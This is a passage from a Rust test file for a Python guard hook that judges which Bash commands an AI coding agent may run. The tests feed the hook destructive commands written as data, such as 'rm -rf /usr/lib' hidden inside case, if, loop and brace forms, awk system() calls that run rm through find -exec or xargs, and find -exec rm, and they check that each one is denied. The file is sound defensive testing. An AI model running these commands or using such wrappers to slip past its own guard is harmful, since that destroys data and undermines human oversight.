        .args(["-c", "user.name=t", "-c", "user.email=t@example.com"])
        .args(args)
        .env_remove("GIT_DIR")
        .env_remove("GIT_WORK_TREE")
        .status()
        .unwrap();
    assert!(st.success(), "git {args:?} failed in {dir:?}");
}

#[test]
#[ignore = "backlog a529cd11: open defect, remove ignore when fixed"]
fn backlog_a529cd11_guard_maintree_bsd_sed_empty_suffix_with_worktree_path_is_allowed() {
    let base = unique_home("a529");
    let main = base.0.join("main");
    let wt = base.0.join("wt");
    std::fs::create_dir_all(&main).unwrap();
    git_in(&main, &["init", "-q"]);
    git_in(&main, &["commit", "-q", "--allow-empty", "-m", "x"]);
    git_in(
        &main,
        &["worktree", "add", "-q", "-b", "w", wt.to_str().unwrap()],
    );
    let target = wt.join("file.txt");
    std::fs::write(&target, "A\n").unwrap();
    let guard = repo_root().join("scripts/guard-maintree-bash.py");
    let run = |cmd: String| -> (i32, String) {
        let payload = serde_json::json!({
            "session_id": "s", "cwd": &wt, "hook_event_name": "PreToolUse",
            "tool_name": "Bash", "tool_input": {"command": cmd},
        })
        .to_string();
        let mut child = Command::new("python3")
            .arg(&guard)
            .current_dir(&wt)
            .env("CLAUDE_PROJECT_DIR", &main)
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .unwrap();
        child
            .stdin
            .take()
            .unwrap()
            .write_all(payload.as_bytes())
            .unwrap();
        let o = child.wait_with_output().unwrap();
        (
            o.status.code().unwrap_or(-1),
            String::from_utf8_lossy(&o.stderr).into_owned(),
        )
    };
    let t = target.to_str().unwrap();
    // Control: the GNU spelling of the same edit of the same file is allowed.
    let (rc, err) = run(format!("sed -i 's|A|B|' {t}"));
    assert_eq!(rc, 0, "control (GNU sed form) refused: {err}");
    let (rc, err) = run(format!("sed -i '' 's|A|B|' {t}"));
    assert_eq!(
        rc, 0,
        "BSD sed -i '' with an absolute worktree path refused: {err}"
    );
}

// ================================================================ FIXED pins (pass today)
// ---------------------------------------------------------------- 0f7da221
#[test]
fn backlog_0f7da221_find_exec_and_xargs_reach_the_awk_judgment() {
    let (d, _) = verdict("find . -exec awk '{system(\"rm \" $1)}' {} \\;");
    assert_ne!(d, "allow", "find -exec awk system() slipped through");
    let (d, _) = verdict("echo a | xargs awk '{system(\"rm \" $1)}'");
    assert_ne!(d, "allow", "xargs awk system() slipped through");
    // Control: a benign awk program is still allowed.
    assert_eq!(verdict("find . -exec awk '{print}' {} \\;").0, "allow");
    assert_eq!(verdict("echo a | xargs awk '{print}'").0, "allow");
}

// ---------------------------------------------------------------- 21cd115e
#[test]
fn backlog_21cd115e_quoted_prose_naming_a_protected_path_is_not_an_operand() {
    assert_eq!(
        verdict("mytool \"prose .githooks/pre-commit here\"").0,
        "allow"
    );
    assert_eq!(
        verdict("mytool 'prose .githooks/pre-commit here'").0,
        "allow"
    );
    // Control: the bare path operand still asks.
    assert_ne!(verdict("mytool .githooks/pre-commit").0, "allow");
}

// ---------------------------------------------------------------- 65d4fc18
#[test]
fn backlog_65d4fc18_compound_and_loop_forms_judge_the_inner_command() {
    for cmd in [
        "case x in x) rm -rf /usr/lib;; esac",
        "if true; then rm -rf /usr/lib; fi",
        "{ rm -rf /usr/lib; }",
        "for f in x; do rm -rf /usr/lib; done",
        "while true; do rm -rf /usr/lib; done",
        "for f in rm; do $f -rf /usr/lib; done",
    ] {
        let (d, r) = verdict(cmd);
        assert_eq!(
            d, "deny",
            "`{cmd}` must be denied on its inner rm: {d} | {r}"
        );
    }
    // A loop variable that stays opaque is not silently allowed.
    let (d, r) = verdict("for f in a; do $f x; done");
    assert_ne!(
        d, "allow",
        "opaque loop variable as command word allowed: {d} | {r}"
    );
    // Control: a benign compound stays allowed.
    assert_eq!(verdict("for f in a b; do echo $f; done").0, "allow");
}

// ---------------------------------------------------------------- 400d3963
#[test]
fn backlog_400d3963_writing_a_file_that_does_not_exist_is_not_a_truncation() {
    let name = format!("bg_audit_s02_absent_{}.txt", std::process::id());
    let path = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join(&name);
    assert!(!path.exists(), "precondition: {name} must not exist");
    let (d, r) = verdict(&format!("echo hi | tee {name}"));
    assert_eq!(d, "allow", "tee to a new file: {d} | {r}");
    let (d, r) = verdict(&format!("cargo test 2> {name}"));
    assert_eq!(d, "allow", "redirect to a new file: {d} | {r}");
    assert!(!path.exists(), "the probe must not have created the file");
}

// ---------------------------------------------------------------- 6354ae7a
#[test]
fn backlog_6354ae7a_find_execdir_and_ok_get_the_same_placement_as_exec() {
    let exec = verdict("find /tmp/bg_audit_s02_x -exec rm {} \\;");
    assert_eq!(
        exec.0, "ask",
        "control (-exec confined to a temp root): {exec:?}"
    );
    for pred in ["-execdir", "-ok", "-okdir"] {
        let got = verdict(&format!("find /tmp/bg_audit_s02_x {pred} rm {{}} \\;"));
        assert_eq!(got.0, exec.0, "{pred} verdict differs from -exec: {got:?}");
    }
}
